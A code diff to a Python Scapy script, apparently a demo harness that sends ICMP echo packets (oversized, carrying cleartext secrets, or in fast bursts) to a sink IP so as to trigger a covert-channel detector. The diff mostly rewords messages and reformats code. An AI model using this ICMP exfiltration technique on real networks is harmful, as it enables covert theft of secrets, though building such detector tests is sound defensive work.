@@ -1,5 +1,3 @@
-from __future__ import annotations
-
 import argparse
 import time
 
@@ -21,79 +19,85 @@ WINDOWS_BENIGN_PAYLOAD = b"abcdefghijklmnopqrstuvwabcdefghi"
 
 
 def send_oversized(target: str, data: str) -> None:
-    """Executes the oversized payload bulk dump attack."""
+    """Send oversized payload (>64 bytes) to trigger the structural detector"""
     render_attack_banner(
         target=target,
         scenario_mode="Oversized Frame Exfiltration",
-        scenario_description="Transmit bulky bulk payload exceeding OS threshold (>64B)",
+        scenario_description="Send large payload exceeding OS default size (>64B)",
         expected_alert_identifier="icmp_oversized_payload (HIGH severity)",
     )
 
     payload = data.encode("utf-8")
-    render_payload_telemetry(payload, panel_title="Forged Jumbo ICMP Payload")
+    render_payload_telemetry(payload, panel_title="Oversized ICMP Payload")
 
-    print_status("Injecting crafted frame onto network stack...")
+    print_status("Sending crafted packet...")
     pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
     send(pkt, verbose=False)
-    print_success(f"1 Frame dispatched to [yellow]{target}[/].")
-    print_hint("Observe 'covert-detector' logs for structural alert trigger.")
+    print_success(f"1 packet sent to [yellow]{target}[/].")
+    print_hint("Check covert-detector logs for the alert.")
 
 
 def send_sensitive(target: str, data: str) -> None:
-    """Executes the cleartext sensitive data exfiltration scenario."""
+    """Cleartext sensitive data exfiltration (tests the L7 regex/Luhn scanner)"""
     render_attack_banner(
         target=target,
         scenario_mode="Sensitive Cleartext Exfiltration",
-        scenario_description="Hide unencrypted PCI-DSS/API secret inside ICMP Echo Request",
+        scenario_description="Unencrypted credit card / secret inside ICMP Echo",
         expected_alert_identifier="icmp_sensitive_data_* (CRITICAL/HIGH via L7 scanner)",
     )
 
     payload = data.encode("utf-8")
-    render_payload_telemetry(payload, panel_title="Exfiltrated Secret in Echo Payload")
+    render_payload_telemetry(payload, panel_title="Payload with Exfiltrated Secret")
 
-    print_status("Injecting packet through gateway...")
+    print_status("Sending packet...")
     pkt = IP(dst=target) / ICMP(type=8) / Raw(load=payload)
     send(pkt, verbose=False)
-    print_success("Packet dispatched with embedded secret.")
-    print_hint("Observe 'covert-detector' logs for L7 keyword/Luhn detection.")
+    print_success("Packet sent with sensitive data.")
+    print_hint("Check covert-detector logs for the L7 scanner alert.")
 
 
 def send_burst(target: str, count: int, delay: float) -> None:
-    """Executes a high-frequency packet burst to test behavioral heuristics."""
+    """Fast packet burst to test sliding-window rate limiting"""
     render_attack_banner(
         target=target,
         scenario_mode="High-Frequency Burst Flooding",
-        scenario_description=f"Rapidly dispatch {count} packets at {1 / delay:.0f} pkt/s (>4 pkt/s limit)",
-        expected_alert_identifier="icmp_high_frequency (Rate Limiting heuristic)",
+        scenario_description=f"Send {count} packets at {1 / delay:.0f} pkt/s (>4 pkt/s limit)",
+        expected_alert_identifier="icmp_high_frequency (Rate Limiting)",
     )
 
-    with BurstProgressTracker(total_packet_count=count, task_description="Burst Stream") as tracker:
+    with BurstProgressTracker(
+        total_packet_count=count, task_description="Burst Stream"
+    ) as tracker:
         for seq in range(count):
-            payload = WINDOWS_BENIGN_PAYLOAD
-            pkt = IP(dst=target) / ICMP(type=8, seq=seq) / Raw(load=payload)
+            pkt = (
+                IP(dst=target)
+                / ICMP(type=8, seq=seq)
+                / Raw(load=WINDOWS_BENIGN_PAYLOAD)
+            )
             send(pkt, verbose=False)
-            tracker.step(packet_sequence_index=seq, payload_size_in_bytes=len(payload))
+            tracker.step(
+                packet_sequence_index=seq,
+                payload_size_in_bytes=len(WINDOWS_BENIGN_PAYLOAD),
+            )
             time.sleep(delay)
 
-    print_success(f"Burst sequence concluded ({count} packets sent in {count * delay:.2f}s).")
-    print_hint(
-        "Observe 'covert-detector' logs: packets 1-4 pass, packet 5+ triggers rate limit."
-    )
+    print_success(f"Burst finished ({count} packets sent in {count * delay:.2f}s).")
+    print_hint("Covert-detector logs: packets 1-4 pass, rate limit triggers on 5th+.")
 
 
-def main() -> None:
+def main():
     parser = argparse.ArgumentParser(
-        description="Live-Demo ICMP Covert Channel Exfiltration Tool"
+        description="ICMP covert channel exfiltration demo script"
     )
-    parser.add_argument("--target", default=DEFAULT_TARGET, help="Destination sink IP")
+    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target sink IP")
     parser.add_argument(
         "--mode",
         choices=["oversized", "sensitive", "burst"],
         required=True,
-        help="Attack scenario to execute",
+        help="Attack scenario to run",
     )
     parser.add_argument(
-        "--data", default="", help="Custom string or secret to transmit"
+        "--data", default="", help="Custom payload string or secret to send"
     )
     parser.add_argument(
         "--count",
@@ -105,7 +109,7 @@ def main() -> None:
         "--delay",
         type=float,
         default=0.05,
-        help="Interval between packets in burst mode (seconds, default: 0.05)",
+        help="Interval between packets in seconds (default: 0.05)",
     )
 
     args = parser.parse_args()
